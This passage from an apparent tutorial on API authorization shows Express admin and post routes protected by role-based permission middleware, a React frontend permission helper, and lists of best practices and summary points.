    await Post.findByIdAndDelete(req.params.id);
    res.json({ message: "Post deleted" });
  }
);

// Publish post (only editors and admins)
router.post(
  "/posts/:id/publish",
  authMiddleware,
  isActive,
  hasPermission("posts.publish"),
  async (req, res) => {
    const post = await Post.findByIdAndUpdate(
      req.params.id,
      { status: "published" },
      { new: true }
    );
    res.json({ post });
  }
);

module.exports = router;
```

---

#### **Step 6: Admin Routes**

```javascript
// routes/admin.js
const router = express.Router();

// All admin routes require authentication and admin permission
router.use(authMiddleware);
router.use(hasPermission("users.read.all"));

// Get all users
router.get("/users", async (req, res) => {
  const users = await User.find().select("-password");
  res.json({ users });
});

// Update user role
router.patch(
  "/users/:id/role",
  hasPermission("users.manage.roles"),
  async (req, res) => {
    const { role } = req.body;
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { role },
      { new: true }
    ).select("-password");
    res.json({ user });
  }
);

// Deactivate user
router.patch(
  "/users/:id/deactivate",
  hasPermission("users.update.all"),
  async (req, res) => {
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { isActive: false },
      { new: true }
    ).select("-password");
    res.json({ user });
  }
);

// Delete user
router.delete(
  "/users/:id",
  hasPermission("users.delete.all"),
  async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ message: "User deleted" });
  }
);

module.exports = router;
```

---

#### **Step 7: Frontend Permission Checking**

```javascript
// utils/permissions.js
export const hasPermission = (user, permission) => {
  if (!user) return false;

  const rolePermissions = ROLE_PERMISSIONS[user.role] || [];
  const customPermissions = user.permissions || [];
  const allPermissions = [...rolePermissions, ...customPermissions];

  return allPermissions.includes(permission);
};

// React component
function PostActions({ post, currentUser }) {
  const canEdit =
    hasPermission(currentUser, "posts.update.all") ||
    (hasPermission(currentUser, "posts.update.own") &&
      post.authorId === currentUser.id);

  const canDelete =
    hasPermission(currentUser, "posts.delete.all") ||
    (hasPermission(currentUser, "posts.delete.own") &&
      post.authorId === currentUser.id);

  const canPublish = hasPermission(currentUser, "posts.publish");

  return (
    <div>
      {canEdit && <button onClick={handleEdit}>Edit</button>}
      {canDelete && <button onClick={handleDelete}>Delete</button>}
      {canPublish && <button onClick={handlePublish}>Publish</button>}
    </div>
  );
}
```

---

**Best Practices:**

1. ✅ **Principle of Least Privilege** - Give minimum permissions needed
2. ✅ **Always authenticate first** - Authorization requires authentication
3. ✅ **Check on server** - Never trust client-side checks alone
4. ✅ **Use middleware** - Keep authorization logic separate
5. ✅ **Log access attempts** - Audit who accessed what
6. ✅ **Fail securely** - Default to deny access
7. ✅ **Test thoroughly** - Test all permission combinations
8. ✅ **Document permissions** - Clear permission descriptions
9. ✅ **Regular audits** - Review and update permissions
10. ✅ **Use constants** - Avoid hardcoding permission strings

---

**Summary:**

Authorization in APIs requires:

1. **Authentication** (who are you?)
2. **Authorization** (what can you do?)
3. **Clear permission model** (RBAC/ABAC)
4. **Middleware for checks** (reusable logic)
5. **Resource ownership** (attribute-based)
6. **Frontend guards** (UX only, not security)
7. **Audit logging** (track access)
8. **Regular reviews** (keep permissions updated)
